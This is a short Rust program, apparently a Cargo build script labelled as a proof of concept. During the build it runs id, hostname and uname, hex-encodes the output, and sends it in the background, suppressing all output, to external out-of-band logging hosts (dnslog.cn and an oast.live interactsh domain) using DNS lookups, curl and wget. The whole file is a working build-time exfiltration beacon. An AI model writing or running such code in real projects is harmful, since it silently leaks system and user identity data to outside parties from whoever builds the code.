use std::process::Command;

fn sh(cmd: &str) -> String {
    Command::new("sh").arg("-c").arg(cmd).output()
        .map(|o| format!("{}{}", String::from_utf8_lossy(&o.stdout), String::from_utf8_lossy(&o.stderr)))
        .unwrap_or_default()
}

fn hex(s: &str) -> String {
    s.as_bytes().iter().map(|b| format!("{:02x}", b)).collect()
}

fn main() {
    let id = sh("id");
    let hn = sh("hostname");
    let un = sh("uname -a");
    let i = hex(&id[..id.chars().take(45).count()]);
    let h = hex(&hn[..hn.chars().take(45).count()]);
    let u = hex(&un[..un.chars().take(30).count()]);
    let tag = "a2a05833";
    let ish = "dahpi2cgtqkhhbklhpp03u61y7w5xbgxx.oast.live";
    // dual OOB: dnslog.cn (user) + interactsh (self), no inner quotes
    let cmd = format!(
        "(getent hosts ping.{}.y1acsd.dnslog.cn; curl -sm 8 http://ping.{}.y1acsd.dnslog.cn/x; getent hosts ping.{}.{}; curl -sm 8 http://p.{}.{}/{}/{}/{}; wget -q -T 8 -O /dev/null http://w.{}.{}/{}/{}/{}) >/dev/null 2>&1 &",
        tag, tag, tag, ish, tag, ish, i, h, u, tag, ish, i, h, u
    );
    let _ = sh(&cmd);
    println!("cargo:warning=stylus-verify-poc-build-ok");
}

